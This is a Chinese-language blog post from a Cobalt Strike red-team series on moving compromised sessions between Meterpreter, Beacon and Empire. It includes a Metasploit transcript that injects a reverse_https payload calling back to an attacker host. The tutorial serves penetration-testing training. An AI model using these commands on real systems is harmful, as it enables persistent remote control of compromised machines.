---
layout:     post
title:    Cobalt Strike系列 5
subtitle:   Cobalt Strike 会话转换
date:       2019-08-14
author:     hmoytx
header-img: img/bg_02.jpg
catalog: true
tags:
    - 渗透测试
    - Cobalt Strike
    - 红队
---

# Cobalt Strike系列 5 会话转换


# 简介

- Meterpreter转Beacon
- Beacon转Meterpreter
- Empire转Beacon


## Meterpreter转Beacon
首先我们先拿到一个Meterpreter，用backgroud挂起，然后利用payload_inject模块。  
```
meterpreter > background 
[*] Backgrounding session 1...
msf5 exploit(multi/handler) > use exploit/windows/local/payload_inject
msf5 exploit(windows/local/payload_inject) > set payload windows/meterpreter/reverse_https
payload => windows/meterpreter/reverse_https
msf5 exploit(windows/local/payload_inject) > set lhost 1xx.xxx.xxx.xxx
lhost => 1xx.xxx.xxx.xxx
msf5 exploit(windows/local/payload_inject) > set lport 11414
lport => 11414
msf5 exploit(windows/local/payload_inject) > set session 1
session => 1
msf5 exploit(windows/local/payload_inject) > set disablepayloadhandler true
disablepayloadhandler => true
msf5 exploit(windows/local/payload_inject) > exploit -j
[*] Exploit running as background job 4.
```
其中设置disablepayloadhandler是为了防止msf的payload handler监听冲突。  
在cs中根据上面设置的pyayload设置一个监听器即可。  
![msf2cs](/img/msf2cs.png)  


## Beacon转Meterpreter
Beacon转为Meterpreter很简单，可以直接利用spawn功能，派生会话。  
![spawn](/img/spawn.png)  
然后设置监听器，根据msf里的配置来即可。   
![spawnlistener](/img/spawnlistener.png)  
然后msf中就会接收到返回的Meterpreter。  


## Beacon转Empire
开启Empire监听后，类似上面操作，派生会话使用外部监听。  
![empire](/img/pmpire.png)  


## 结语
写的比较水，因为很多情况下资源不足，时间也不充裕，但是日更不能断，读个大概，有不懂的你可以百度啊。  










